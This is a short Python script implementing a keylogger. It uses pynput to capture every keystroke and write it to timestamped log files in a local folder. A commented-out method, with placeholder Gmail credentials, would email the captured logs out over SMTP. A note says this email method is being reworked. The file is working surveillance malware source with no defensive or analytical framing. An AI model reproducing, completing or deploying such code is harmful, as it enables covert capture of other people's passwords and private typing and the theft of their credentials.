#!/usr/bin/env python
# -*-coding:utf-8 -*-

from pynput.keyboard import Key, Listener
import logging
import os
#import smtplib # for sending email using SMTP protocol (gmail)
from datetime import datetime

email = "EMAIL_ADDRESS_HERE"
password = "EMAIL_PASSWORD_HERE"

class Keylogger:
        
    def create_log_directory(self):
        sub_dir = "log"
        cwd = os.getcwd()
        self.log_dir = os.path.join(cwd,sub_dir)
        if not os.path.exists(sub_dir):
            os.mkdir(sub_dir)
    
    
    @staticmethod
    def on_press(key):
        try:
            logging.info(str(key))
        except Exception as e:
            logging.info(e)
        
            
    def write_log_file(self):
        # time format example: '2021-05-29-171747'
        time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
        # logging info in the file
        logging.basicConfig(
                 filename=(os.path.join(self.log_dir, time) + "-log.txt"),
                 level=logging.DEBUG, 
                 format= '[%(asctime)s]: %(message)s',
             )
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()
    
        #Currently in the process of reconstructing a different email method, as this one seems to be having issues.

        #def send_mail(self, email, password, TO, msg):
        #    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        #        try:
        #            server.starttls()    # enable secure TLS mode
        #            server.login(email, password)
        #            server.sendmail(email, TO, msg)
        #        except Exception as e:
        #            pass
        #        finally:
        #            server.quit()



if __name__ == "__main__":
    klog = Keylogger()
    klog.create_log_directory()
    klog.write_log_file()